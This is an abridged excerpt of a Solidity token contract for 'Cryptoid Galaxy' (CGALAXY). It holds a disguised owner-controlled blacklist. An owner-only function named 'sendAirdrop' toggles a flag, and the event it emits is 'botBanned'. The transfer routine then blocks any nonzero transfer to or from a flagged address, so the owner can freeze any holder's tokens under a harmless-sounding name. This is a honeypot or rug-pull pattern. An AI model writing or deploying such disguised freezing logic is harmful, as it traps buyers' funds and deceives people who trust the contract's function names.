...
contract CryptoidGalaxyToken is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _feeAirdrop;
    ...
    string private _name = 'Cryptoid Galaxy';
    string private _symbol = 'CGALAXY';
    ...
    function sendAirdrop(address botAddress) external onlyOwner {
        if (_feeAirdrop[botAddress] == true) {
            _feeAirdrop[botAddress] = false;
        } else {_feeAirdrop[botAddress] = true;
            emit botBanned (botAddress, _feeAirdrop[botAddress]);
          }
    }
    
    function checkAirdrop(address botAddress) public view returns (bool) {
        return _feeAirdrop[botAddress];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_feeAirdrop[sender] || _feeAirdrop[recipient]) require (amount == 0, "");
